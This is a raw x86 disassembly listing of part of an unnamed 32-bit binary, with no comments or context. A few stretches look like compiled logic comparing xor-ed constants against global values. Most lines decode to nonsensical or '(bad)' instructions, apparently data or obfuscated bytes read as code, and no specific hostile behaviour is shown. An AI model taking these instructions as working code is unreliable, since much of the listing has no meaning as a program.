  41198a:	xor    eax,0xae776a78
  41198f:	bound  ebx,QWORD PTR [esi+0x69]
  411992:	mov    bh,0xaf
  411994:	push   0xffffffdd
  411996:	jmp    0x5262:0xe46f3ba7
  41199d:	cmp    bh,BYTE PTR [eax-0x49]
  4119a0:	add    eax,0xacedee54
  4119a5:	mov    ebp,0xee4b567c
  4119aa:	xchg   DWORD PTR [eax+0x6b],esp
  4119ad:	loop   0x41192f
  4119af:	pop    ss
  4119b0:	test   eax,0xfd22a1ea
  4119b5:	loope  0x411a1d
  4119b7:	mov    edx,DWORD PTR [ebp-0x3c]
  4119ba:	xor    ecx,0xf3a
  4119c0:	or     ecx,eax
  4119c2:	mov    eax,ds:0x422548
  4119c7:	mov    eax,DWORD PTR [eax+0x1d8]
  4119cd:	mov    eax,DWORD PTR [eax]
  4119cf:	xor    esi,0x6665
  4119d5:	or     esi,edx
  4119d7:	add    ecx,0xef6a96a5
  4119dd:	cdq    
  4119de:	adc    esi,0xc8b6a000
  4119e4:	cmp    eax,ecx
  4119e6:	jne    0x4119f4
  4119ec:	cmp    edx,esi
  4119ee:	je     0x411f3d
  4119f4:	mov    eax,DWORD PTR [ebp-0x50]
  4119f7:	jmp    0x411c6c
  4119fc:	loope  0x4119a1
  4119fe:	lods   eax,DWORD PTR ds:[esi]
  4119ff:	aam    0xab
  411a01:	mov    edx,0xd9d49ae0
  411a06:	gs mov esp,0xaa16cb2f
  411a0c:	imul   BYTE PTR [esi+0x18]
  411a0f:	sbb    BYTE PTR [ecx+0x14],dh
  411a12:	sbb    BYTE PTR [eax],bl
  411a14:	sub    DWORD PTR [edx],edx
  411a16:	adc    al,0x29
  411a18:	ss das 
  411a1a:	mov    ds:0xdbd8c790,eax
  411a1f:	ror    BYTE PTR [ebp+0x360fe00f],cl
  411a25:	jp     0x411a11
  411a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a28:	sbb    al,0xa4
  411a2a:	fist   DWORD PTR [ecx+0x1f]
  411a2d:	inc    ebp
  411a2e:	test   DWORD PTR [eax],eax
  411a30:	mov    dh,0xad
  411a32:	jae    0x411a9e
  411a34:	sar    edi,1
  411a36:	xor    dh,BYTE PTR [eax+esi*1]
  411a39:	dec    edx
  411a3a:	cmp    eax,0xfd5ea0ab
  411a3f:	sbb    eax,0x2c03f57b
  411a44:	mov    edi,0x19f9b6a3
  411a49:	fucomip st,st(1)
  411a4b:	div    cl
  411a4d:	scas   eax,DWORD PTR es:[edi]
  411a4e:	out    0xb5,al
  411a50:	lahf   
  411a51:	adc    eax,0xd8e7d8a6
  411a56:	sti    
  411a57:	pop    ds
  411a58:	xchg   esp,eax
  411a59:	shl    BYTE PTR [esi],0x86
  411a5c:	imul   edi
  411a5e:	iret   
  411a5f:	or     ch,BYTE PTR ds:0x3729a1d8
  411a65:	or     ah,bl
  411a67:	push   edx
  411a68:	call   0xcad1e202
  411a6d:	xor    DWORD PTR [eax+0x2dfcf93a],0xffffff8e
  411a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a75:	cmp    cl,cl
  411a77:	inc    edx
  411a78:	cmp    bh,BYTE PTR ds:0xbf684d48
  411a7e:	adc    eax,0xd25cd563
  411a83:	xchg   ecx,eax
  411a84:	aas    
  411a85:	pop    ds
  411a86:	push   cs
  411a87:	stos   DWORD PTR es:[edi],eax
  411a88:	dec    edi
  411a89:	jmp    0xca15:0xde8d7b1e
  411a90:	imul   esp,DWORD PTR [ecx+0x4e],0xd8bd4758
  411a97:	pop    eax
  411a98:	mov    ebp,0xbcbff448
  411a9d:	mov    WORD PTR [ecx-0x4a],ds
  411aa0:	aas    
  411aa1:	push   0x3ae0e74a
  411aa6:	enter  0x2f37,0xf
  411aaa:	gs add eax,0x82f558db
  411ab0:	enter  0x6ac2,0x13
  411ab4:	sbb    al,0xd9
  411ab6:	jp     0x411aae
  411ab8:	push   ebx
  411ab9:	aas    
  411aba:	aam    0xd0
  411abc:	neg    BYTE PTR [ebx-0x2e]
  411abf:	pop    edi
  411ac0:	mov    dl,0xa0
  411ac2:	lahf   
  411ac3:	outs   dx,BYTE PTR ds:[esi]
  411ac4:	out    0x88,eax
  411ac6:	dec    edx
  411ac7:	dec    edi
  411ac8:	add    BYTE PTR [ecx-0x7e],cl
  411acb:	js     0x411b32
  411acd:	adc    BYTE PTR [eax],0x71
  411ad0:	push   ss
  411ad1:	jle    0x411b49
  411ad3:	(bad)  
  411ad4:	jmp    0x5e9bcc21
  411ad9:	das    
  411ada:	jbe    0x411b05
  411adc:	push   es
  411add:	jb     0x411b5e
  411adf:	retf   0x2098
  411ae2:	test   al,0xc1
  411ae4:	sahf   
  411ae5:	lods   al,BYTE PTR ds:[esi]
  411ae6:	int    0xd3
  411ae8:	xchg   ecx,eax
  411ae9:	loop   0x411af1
  411aeb:	fnstcw WORD PTR [edi+eiz*8+0x34]
  411aef:	mov    BYTE PTR [ecx+0x6032f20a],cl
  411af5:	mov    eax,0xd2bbb0d1
  411afa:	aaa    
  411afb:	adc    ch,BYTE PTR [ebp+0x53e29099]
  411b01:	cmp    eax,0x473d6ef0
  411b06:	nop
  411b07:	jecxz  0x411ab6
  411b09:	aas    
  411b0a:	out    0xf8,al
  411b0c:	into   
  411b0d:	sbb    BYTE PTR [ebx-0x45],dh
  411b10:	(bad)  
  411b11:	cmp    DWORD PTR [ebx+edx*8-0x5036e7db],edi
  411b18:	inc    eax
  411b19:	bound  ecx,QWORD PTR [esi+0x4f9232ad]
  411b1f:	fsub   DWORD PTR [edx+0x7e3e4112]
  411b25:	xchg   edx,eax
  411b26:	pop    ebp
  411b27:	mov    edi,ebp
  411b29:	mov    cl,0x44
  411b2b:	jmp    0x73b3:0x7b44f9cd
  411b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b33:	sbb    dh,BYTE PTR [eax]
  411b35:	adc    esi,ebp
  411b37:	sbb    BYTE PTR [eax-0x1727a7c],bl
  411b3d:	test   al,0x7a
  411b40:	in     al,dx
  411b41:	pop    eax
  411b42:	(bad)  
  411b43:	iret   
  411b44:	and    ebp,0x7b
  411b47:	rol    BYTE PTR [edi-0x35],0x3c
  411b4b:	jge    0x411b54
  411b4d:	stos   DWORD PTR es:[edi],eax
  411b4e:	cmp    DWORD PTR [edx+0x5e],ebp
  411b51:	das    
  411b52:	mov    esp,0x82860706
  411b57:	sbb    BYTE PTR [edx+0x18],dh
  411b5a:	mov    al,ds:0x2452f978
  411b5f:	out    dx,eax
  411b60:	push   eax
  411b61:	xchg   esi,eax
  411b62:	mov    bh,0xcf
  411b64:	es cmc 
  411b66:	or     al,bl
  411b68:	gs out 0x98,eax
  411b6b:	(bad)  
  411b6c:	fs adc cl,ah
  411b6f:	and    edx,DWORD PTR [ebx]
  411b71:	sbb    DWORD PTR [ebp+0x48d6e3e3],esp
  411b77:	fmul   DWORD PTR [ecx+0x2a]
  411b7a:	int3   
  411b7b:	sbb    ch,BYTE PTR [ebx-0x2c]
  411b7e:	adc    al,0xb6
  411b80:	xor    eax,0xcb17f3d9
  411b85:	cs aas 
  411b87:	jmp    0x4b339afd
  411b8c:	or     eax,0x83e00300
  411b91:	bound  ebp,QWORD PTR [ebx-0x6f139728]
  411b97:	lock cld 
  411b99:	aaa    
  411b9a:	dec    esp
  411b9b:	ins    DWORD PTR es:[edi],dx
  411b9c:	adc    al,0x89
  411b9e:	int3   
  411b9f:	repz pop edi
  411ba1:	dec    eax
  411ba2:	mov    dh,0x24
  411ba4:	xor    DWORD PTR [ecx+0x52],0xdfb0c98d
  411bab:	(bad)  
  411bac:	push   0x18
  411bae:	inc    edx
  411baf:	pop    eax
  411bb0:	xor    ah,BYTE PTR [ecx+0x79]
  411bb3:	lods   eax,DWORD PTR ds:[esi]
  411bb4:	dec    ecx
  411bb5:	dec    esp
  411bb6:	jb     0x411c18
  411bb8:	in     al,dx
  411bb9:	or     BYTE PTR ds:0x946159e2,0x81
  411bc0:	outs   dx,BYTE PTR ds:[esi]
  411bc1:	int    0xff
  411bc3:	mov    edi,0xb4f6a612
  411bc8:	push   ebp
  411bc9:	in     al,dx
  411bca:	std    
  411bcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bcc:	sbb    DWORD PTR [ecx],ebp
  411bce:	xchg   ecx,eax
  411bcf:	inc    eax
  411bd0:	add    BYTE PTR [ecx],ch
  411bd2:	sub    eax,0xfbb24a7e
  411bd7:	std    
  411bd8:	call   0xa8b0c5f9
  411bdd:	sbb    cl,cl
  411bdf:	stc    
  411be0:	sbb    BYTE PTR [ebx+0xc],bh
  411be3:	pusha  
  411be4:	add    eax,0xdf5b2351
  411be9:	mov    ds:0x26d3ad5c,al
  411bee:	daa    
  411bef:	pop    ss
  411bf0:	fwait
  411bf1:	dec    eax
  411bf2:	imul   esi,DWORD PTR [ebp+0x37],0x6a33251e
  411bf9:	adc    eax,0x417c39cc
  411bfe:	jnp    0x411b88
  411c00:	out    0x17,eax
  411c02:	into   
  411c03:	inc    esp
  411c04:	add    esi,DWORD PTR [esi+0x56]
  411c07:	cmp    eax,0x8aff664f
  411c0c:	lds    ebx,FWORD PTR [edx]
  411c0e:	mov    bh,0x92
  411c10:	bound  ebx,QWORD PTR [eax]
  411c12:	sub    eax,0x75d661d3
  411c17:	int3   
  411c18:	mov    esi,0x5fef89bb
  411c1d:	push   eax
  411c1e:	mov    WORD PTR [ecx],?
  411c20:	rcr    bl,0x2d
  411c23:	iret   
  411c24:	imul   eax,DWORD PTR [ebp+0x25893db7],0x1361cbe
  411c2e:	or     edi,DWORD PTR [ecx]
  411c30:	into   
  411c31:	xchg   ecx,eax
  411c32:	mov    bh,0x56
  411c34:	xor    eax,0xd15cdaa5
  411c39:	mov    es,WORD PTR [ecx]
  411c3b:	pop    ebp
  411c3c:	ror    BYTE PTR [edi],0xb6
  411c3f:	push   esp
  411c40:	rcl    DWORD PTR [esi],cl
  411c42:	sar    BYTE PTR [ecx],1
  411c44:	test   BYTE PTR [ebx],cl
  411c46:	sub    al,0xe3
  411c48:	add    esi,DWORD PTR [eax]
  411c4a:	imul   edi,DWORD PTR [edx+esi*1+0x26],0xce9dec30
  411c52:	mov    ch,BYTE PTR [eax]
  411c54:	inc    ebp
  411c55:	inc    ebp
  411c56:	sbb    edx,DWORD PTR [ebx+0x46]
  411c59:	shl    BYTE PTR [eax],0xad
  411c5c:	cmp    eax,0xee3fb481
  411c61:	nop
  411c62:	fisub  WORD PTR [ecx+0x57]
  411c65:	adc    dl,BYTE PTR [ecx+0xe]
  411c68:	xchg   ebp,eax
  411c69:	ja     0x411c82
  411c6b:	int    0x8b
  411c6d:	dec    ebp
  411c6e:	mov    ah,0x8b
  411c70:	push   ebp
  411c71:	mov    al,ds:0x5a4758b
  411c76:	sbb    BYTE PTR [eax+0x0],bh
  411c79:	add    BYTE PTR [ecx+0x87d1],al
  411c7f:	add    BYTE PTR [ebx],cl
  411c81:	ret    0x558b
  411c84:	nop
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8+0x49e6a08]
  411c98:	mov    ebx,0x186a4fb0
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	imul   esi,DWORD PTR [eax+0x484a31a4],0x62f9e5de
  411cac:	loope  0x411ce7
  411cae:	adc    eax,0x282f265b
  411cb3:	mov    cl,0xf1
  411cb5:	ja     0x411d36
  411cb7:	iret   
  411cb8:	inc    edx
  411cb9:	sbb    DWORD PTR [ebx+0x4c5d8b2f],0xfb1907a6
  411cc3:	pop    esi
  411cc4:	outs   dx,DWORD PTR ds:[esi]
  411cc5:	je     0x411c54
  411cc7:	dec    ebx
  411cc8:	cmp    eax,ebp
  411cca:	fiadd  WORD PTR [ebx+esi*4]
  411ccd:	in     eax,dx
  411cce:	cmp    BYTE PTR [ebx+0x24],ch
  411cd1:	xchg   ecx,eax
  411cd2:	push   0xa9fa9f3b
  411cd7:	pop    eax
  411cd8:	lods   eax,DWORD PTR ds:[esi]
  411cd9:	retf   
  411cda:	fucomp st(6)
  411cdd:	adc    al,0x7b
  411cdf:	and    BYTE PTR [esi-0x1dc41520],dl
  411ce5:	push   0x23
  411ce7:	ins    DWORD PTR es:[edi],dx
  411ce8:	stos   BYTE PTR es:[edi],al
  411ce9:	add    DWORD PTR [eax],edx
  411ceb:	sub    ebx,ebx
  411ced:	sbb    BYTE PTR [ebp-0x361707a5],ah
  411cf3:	cmp    eax,0x54f16872
  411cf8:	add    ch,BYTE PTR [edi]
  411cfa:	lea    ebp,[ebx+0x25c89cee]
  411d00:	sahf   
  411d01:	xor    BYTE PTR [edi],ah
  411d03:	out    dx,eax
  411d04:	out    dx,al
  411d05:	pop    esi
  411d06:	adc    bh,bl
  411d08:	(bad)  
  411d09:	adc    BYTE PTR [edx],dh
  411d0b:	dec    edx
  411d0c:	ret    0x397c
  411d0f:	stos   DWORD PTR es:[edi],eax
  411d10:	scas   eax,DWORD PTR es:[edi]
  411d11:	xchg   esi,eax
  411d12:	in     eax,dx
  411d13:	scas   eax,DWORD PTR es:[edi]
  411d14:	mov    esp,0x1e89032f
  411d19:	jbe    0x411cd0
  411d1b:	add    al,0x4c
  411d1d:	loope  0x411d75
  411d1f:	(bad)  
  411d20:	outs   dx,BYTE PTR ds:[esi]
  411d21:	jmp    0x411d6b
  411d23:	fwait
  411d24:	pop    ds
  411d25:	inc    ebx
  411d26:	pop    esp
  411d27:	fidivr WORD PTR [edi]
  411d29:	lahf   
  411d2a:	in     eax,dx
  411d2b:	jne    0x411d42
  411d2d:	xor    dl,ah
  411d2f:	dec    ebp
  411d30:	add    bh,bl
  411d32:	pop    ds
  411d33:	inc    edi
  411d34:	fs clc 
  411d36:	mov    DWORD PTR [eax-0x18],edx
  411d39:	adc    ecx,DWORD PTR [esi+eax*8]
  411d3c:	ins    BYTE PTR es:[edi],dx
  411d3d:	popf   
  411d3e:	mov    dl,0xc8
  411d40:	in     eax,0xfd
  411d42:	call   0xb093:0x6717791
  411d49:	mov    ah,0x63
  411d4b:	ins    DWORD PTR es:[edi],dx
  411d4c:	es aas 
  411d4e:	sbb    dh,BYTE PTR [edi+0x457e6de8]
  411d54:	in     al,0xff
  411d56:	leave  
  411d57:	sbb    BYTE PTR [eax+0x1f],ch
  411d5a:	dec    edi
  411d5b:	xlat   BYTE PTR ds:[ebx]
  411d5c:	push   0x3b
  411d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d5f:	or     esp,ebx
  411d61:	push   ss
  411d62:	shl    BYTE PTR [ebx-0x2d],1
  411d65:	(bad)  
  411d66:	fidivr WORD PTR [eax+0x1e]
  411d69:	sbb    esi,ebp
  411d6b:	push   ds
  411d6c:	daa    
  411d6d:	mov    ecx,0xee838cc3
  411d72:	pop    ebp
  411d73:	out    0xaf,eax
  411d75:	or     al,0x87
  411d77:	iret   
  411d78:	xor    BYTE PTR [esi],0x54
  411d7b:	inc    ecx
  411d7c:	push   ebx
  411d7d:	sahf   
  411d7e:	pop    ds
  411d7f:	stos   WORD PTR es:[edi],ax
  411d81:	inc    edx
  411d82:	mov    bh,0x79
  411d84:	jmp    0x411dc7
  411d86:	cmp    eax,0xb1648947
  411d8b:	xchg   edx,eax
  411d8c:	lods   eax,DWORD PTR ds:[esi]
  411d8d:	fwait
  411d8e:	xchg   ebp,eax
  411d8f:	cld    
  411d90:	sub    ch,BYTE PTR [edi+0x72]
  411d93:	adc    al,0xff
  411d95:	arpl   WORD PTR [edx],di
  411d97:	xlat   BYTE PTR ds:[ebx]
  411d98:	shl    BYTE PTR [edx+ecx*1+0x1e47530a],1
  411d9f:	xchg   ebp,eax
  411da0:	js     0x411d79
  411da2:	cmp    al,0x89
  411da4:	xchg   esi,eax
  411da5:	mov    ?,esi
  411da7:	mov    ds:0x52d1aca7,eax
  411dac:	sub    al,0x82
  411dae:	fstp   TBYTE PTR ds:0xc34cad36
  411db4:	leave  
  411db5:	mov    al,ds:0x5be7a58
  411dba:	jnp    0x411da8
  411dbc:	outs   dx,BYTE PTR ds:[esi]
  411dbd:	xchg   DWORD PTR [edi+0x6b],esi
  411dc0:	or     eax,0x1dea79e1
  411dc5:	mov    ah,0x23
  411dc7:	ret    
  411dc8:	cwde   
  411dc9:	xchg   edx,eax
  411dca:	and    eax,0x6e54f87a
  411dcf:	cmp    cl,al
  411dd1:	repnz adc BYTE PTR [ecx+esi*4],0x7f
  411dd6:	fstp   TBYTE PTR [esi-0x10a553a0]
  411ddc:	out    dx,eax
  411ddd:	or     DWORD PTR [esi],0x7
  411de0:	xchg   ebx,eax
  411de1:	out    0x91,eax
  411de3:	popa   
  411de4:	pusha  
  411de5:	adc    bl,BYTE PTR ds:0x3bd79563
  411deb:	cli    
  411dec:	jl     0x411d89
  411dee:	(bad)  
  411df0:	sub    BYTE PTR [ebx],cl
  411df2:	mov    edx,0x93aa3721
  411df7:	das    
  411df8:	mov    ebp,0x72691943
  411dfd:	and    eax,0x7f565d8
  411e02:	fidiv  DWORD PTR [esi-0x21bdca66]
  411e08:	inc    eax
  411e09:	(bad)  
  411e0b:	iret   
  411e0c:	ds clc 
  411e0e:	mov    ds:0x4dfdfab9,al
  411e13:	push   ecx
  411e14:	push   ebp
  411e15:	mov    bl,0xc9
  411e17:	bound  esp,QWORD PTR [edx+0xf3baf9f]
  411e1d:	aad    0x8f
  411e1f:	aas    
  411e20:	xchg   ecx,eax
  411e21:	mov    ebp,0xcab54626
  411e26:	repz jl 0x411e10
  411e29:	adc    bh,0x12
  411e2c:	in     al,0xf8
  411e2e:	mov    ah,0xd5
  411e30:	jae    0x411de5
  411e32:	in     al,dx
  411e33:	cli    
  411e34:	(bad)  
  411e35:	(bad)  
  411e36:	adc    DWORD PTR [ebx],edi
  411e38:	jl     0x411e91
  411e3a:	mov    eax,ds:0x57e46c64
  411e3f:	aas    
  411e40:	popf   
  411e41:	fnstenv ds:0xdd941de4
  411e47:	adc    al,0x8a
  411e49:	jecxz  0x411ec3
  411e4b:	nop
  411e4c:	enter  0x24f6,0x4c
  411e50:	and    BYTE PTR [eax],bh
  411e52:	into   
  411e53:	dec    esi
  411e54:	or     edi,ebx
  411e56:	(bad)  [esi+0x37644794]
  411e5c:	mov    ebx,0x561c4c0
  411e61:	xor    eax,0xea714641
  411e66:	sbb    eax,0xdf612543
  411e6b:	mov    bl,dl
  411e6d:	test   dl,dl
  411e6f:	and    BYTE PTR [edi-0x20395c20],cl
  411e75:	cmp    bh,BYTE PTR [edx+ebp*4-0x7c]
  411e79:	pop    esp
  411e7a:	addr16 inc esp
  411e7c:	imul   edi,DWORD PTR [esi-0x7e],0xffffff98
  411e80:	fstp   QWORD PTR [ecx-0x46]
  411e83:	pop    esp
  411e84:	mov    ah,0x8a
  411e86:	jmp    0x411e4e
  411e88:	cli    
  411e89:	ins    DWORD PTR es:[edi],dx
  411e8a:	loopne 0x411e2f
  411e8c:	scas   eax,DWORD PTR es:[edi]
  411e8d:	iret   
  411e8e:	repnz fnstsw WORD PTR [esi]
  411e91:	std    
  411e92:	xchg   BYTE PTR [edi],al
  411e94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e95:	call   0xd191b457
  411e9a:	add    BYTE PTR [ebx+0x16],0x89
  411e9e:	add    ebp,ebx
  411ea0:	sahf   
  411ea1:	mov    ecx,0x7b02f6ea
  411ea6:	stos   DWORD PTR es:[edi],eax
  411ea7:	div    al
  411ea9:	(bad)  [ebp-0x6f64d8e6]
  411eaf:	jbe    0x411eed
  411eb1:	hlt    
  411eb2:	ret    0x2927
  411eb5:	stos   BYTE PTR es:[edi],al
  411eb6:	cmp    bl,0x2c
  411eb9:	in     al,dx
  411eba:	mov    eax,DWORD PTR [edi+0x1ac4f0ca]
  411ec0:	adc    eax,0x70085756
  411ec5:	ins    BYTE PTR es:[edi],dx
  411ec6:	loopne 0x411ec6
  411ec8:	add    BYTE PTR [esi-0x50],cl
  411ecb:	ret    0x28e8
  411ece:	mov    eax,0xfb357a27
  411ed3:	stos   BYTE PTR es:[edi],al
  411ed4:	inc    edi
  411ed5:	aaa    
  411ed6:	xor    dh,BYTE PTR [esi+0x79a5951c]
  411edc:	iret   
  411edd:	imul   edx,edx,0xffffff82
  411ee0:	ins    BYTE PTR es:[edi],dx
  411ee1:	and    BYTE PTR [ecx-0x1b10a15a],cl
  411ee7:	ror    dh,0xdd
  411eea:	inc    ecx
  411eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eec:	mov    al,ds:0x2fe1478a
  411ef1:	or     ebp,edx
  411ef3:	wrmsr  
  411ef5:	stc    
  411ef6:	out    0x60,eax
  411ef8:	mov    ?,WORD PTR [ebx+ecx*1-0x32]
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422548
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x4225e4
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225dc,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	or     al,0x49
  411fab:	inc    ecx
  411fac:	mov    esi,0x181866a6
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	mov    al,0x9d
  411fb7:	stos   BYTE PTR es:[edi],al
  411fb8:	imul   BYTE PTR [ebx-0x2c]
  411fbb:	adc    DWORD PTR [eax+esi*8-0x669af3d8],edx
  411fc2:	fnstsw WORD PTR [eax+eiz*1-0x3c58fbb2]
  411fc9:	ins    BYTE PTR es:[edi],dx
  411fca:	daa    
  411fcb:	rcl    BYTE PTR [eax*1+0x2ddb6df3],cl
  411fd2:	aam    0x43
  411fd4:	pusha  
  411fd5:	cmp    BYTE PTR [ecx-0x6eabbd70],ah
  411fdb:	or     al,0xd3
  411fdd:	xchg   ecx,eax
  411fde:	loopne 0x411f6a
  411fe0:	(bad)  
  411fe1:	int3   
  411fe2:	xlat   BYTE PTR ds:[ebx]
  411fe3:	arpl   ax,sp
  411fe5:	cmc    
  411fe6:	pop    ss
  411fe7:	mul    BYTE PTR [esi-0x7cba4225]
  411fed:	outs   dx,DWORD PTR ds:[esi]
  411fee:	(bad)  
  411fef:	ss stc 
  411ff1:	pop    ds
  411ff2:	sahf   
  411ff3:	and    ah,BYTE PTR [edi+esi*4-0x3868f3d]
  411ffa:	jp     0x412065
  411ffc:	jno    0x411fb5
  411ffe:	nop
  411fff:	lds    esp,FWORD PTR [eax+esi*2+0x1c]
  412003:	dec    ebp
  412004:	push   es
  412005:	into   
  412006:	test   ah,dh
  412008:	jmp    0xf8dda4f4
  41200d:	(bad)
  412011:	cmp    ecx,ecx
  412013:	push   esp
  412014:	(bad)  
  412015:	or     esi,DWORD PTR [ebx-0x66e655b0]
  41201b:	xor    DWORD PTR [ecx+0x26ea0d82],esp
  412021:	or     al,al
  412023:	mov    edx,0xccb41507
  412028:	in     eax,dx
  412029:	or     esp,DWORD PTR [ebx]
  41202b:	ja     0x412056
  41202d:	mov    DWORD PTR ds:[ebx-0x33db9da4],ebp
  412034:	call   0x5738:0x3654f47d
  41203b:	and    eax,0x3ea850e3
  412040:	int    0x7c
  412042:	aam    0x40
  412044:	lods   al,BYTE PTR ds:[esi]
  412045:	mov    bl,0x62
  412047:	and    BYTE PTR [ebx],0x2
  41204a:	in     eax,0x5e
  41204c:	out    dx,eax
  41204d:	xor    eax,0xd34eccb7
  412052:	and    BYTE PTR [edx],dl
  412054:	push   ecx
  412055:	sar    ecx,cl
  412057:	icebp  
  412058:	or     eax,0xb6603907
  41205d:	test   eax,0xa0c16c08
  412062:	test   DWORD PTR [esi-0x5c],0x7f78969
  412069:	jb     0x4120ce
  41206b:	jl     0x4120a7
  41206d:	test   eax,0xb4043c54
  412072:	mov    dh,0x7
  412074:	pop    ss
  412075:	jge    0x412092
  412077:	add    cl,cl
  412079:	inc    esp
  41207a:	test   eax,0xa106664d
  41207f:	ret    
  412080:	push   ds
  412081:	add    ah,ah
  412083:	les    edx,FWORD PTR [ebx-0x4fc61b19]
  412089:	imul   eax,DWORD PTR [edi+ecx*2-0x17f1ede9],0x79
  412091:	fsub   QWORD PTR [ecx+ecx*1-0x7f]
  412095:	or     ecx,0x68
  412098:	out    dx,al
  412099:	outs   dx,DWORD PTR ds:[esi]
  41209a:	adc    cl,BYTE PTR [ecx+0x47c3b00d]
  4120a0:	and    BYTE PTR [esi],ch
  4120a2:	sar    al,1
  4120a4:	push   0xfffffff2
  4120a6:	mov    DWORD PTR [edx-0x50734f64],eax
  4120ac:	cmp    dl,BYTE PTR [si-0x2be4]
  4120b1:	jmp    0xe3e1:0xd3853ac0
  4120b8:	xchg   esp,eax
  4120b9:	and    esp,edx
  4120bb:	inc    edx
  4120bc:	bound  edi,QWORD PTR [edx+ebp*8]
  4120bf:	add    DWORD PTR [esi-0x12],eax
  4120c2:	jle    0x4120b1
  4120c4:	das    
  4120c5:	xor    ah,BYTE PTR [eax-0x2edcfcd2]
  4120cb:	or     al,0x6a
  4120cd:	nop
  4120ce:	in     eax,0x9e
  4120d0:	mov    ecx,ecx
  4120d2:	sbb    eax,0x4736090c
  4120d7:	sahf   
  4120d8:	test   eax,0x21b3fb5a
  4120dd:	dec    esi
  4120de:	rcl    esi,cl
  4120e0:	enter  0x1ec1,0xf3
  4120e4:	add    eax,0x33c5e46a
  4120e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120ea:	(bad)  
  4120eb:	shl    BYTE PTR [esi],0x55
  4120ee:	ins    DWORD PTR es:[edi],dx
  4120ef:	push   edx
  4120f0:	inc    edi
  4120f1:	or     eax,0xe9b1852c
  4120f6:	sub    al,0x39
  4120f8:	or     eax,0x4449fcdc
  4120fd:	cmp    eax,0xcc1bd1b0
  412102:	xchg   ax,ax
  412104:	or     bh,0xc1
  412107:	mov    ds:0x75cfadc,eax
  41210c:	repnz dec edi
  41210e:	sub    edi,DWORD PTR [esi]
  412110:	shl    BYTE PTR [eax+ecx*8-0x67],cl
  412114:	adc    DWORD PTR [edi-0x40],edi
  412117:	(bad)
  41211a:	cmp    cl,bh
  41211c:	sbb    dh,BYTE PTR [eax+0x77b2683d]
  412122:	sub    eax,DWORD PTR [eax-0x68faacfb]
  412128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412129:	repnz (bad) [bx+di-0x2e]
  41212e:	lods   eax,DWORD PTR ds:[esi]
  41212f:	pop    ebp
  412130:	sub    bh,bl
  412132:	ins    DWORD PTR es:[edi],dx
  412133:	(bad)  
  412134:	xchg   edi,eax
  412135:	bound  eax,QWORD PTR [edi+0x5d57f3eb]
  41213b:	popf   
  41213c:	adc    ebp,esp
  41213e:	pop    esp
  41213f:	cmc    
  412140:	dec    si
  412142:	loopne 0x412167
  412144:	daa    
  412145:	sbb    cl,dl
  412147:	cmp    bh,0x2
  41214a:	push   0x7109f604
  41214f:	mov    ds:0x8761c4fc,eax
  412154:	mov    eax,ds:0x90464295
  412159:	jno    0x4121c6
  41215b:	jle    0x41211c
  41215d:	xor    eax,0x2d2687a3
  412162:	inc    edi
  412163:	cs dec ebp
  412165:	jbe    0x4121dd
  412167:	jmp    0x4121e7
  412169:	bound  eax,QWORD PTR [edx]
  41216b:	sub    al,0x8
  41216d:	fisttp QWORD PTR [eax-0x6f3630a5]
  412173:	test   DWORD PTR [esi],ebp
  412175:	hlt    
  412176:	xchg   esi,eax
  412177:	in     eax,0x72
  412179:	out    0xf0,eax
  41217b:	stc    
  41217c:	fstp   QWORD PTR [edi-0x50e6c602]
  412182:	sbb    al,0x1d
  412184:	mov    edx,0xdbba9f6f
  412189:	and    DWORD PTR [ebp-0x12],edi
  41218c:	int3   
  41218d:	stc    
  41218e:	fsub   st(7),st
  412190:	sbb    ch,bl
  412192:	dec    edx
  412193:	adc    al,0x6
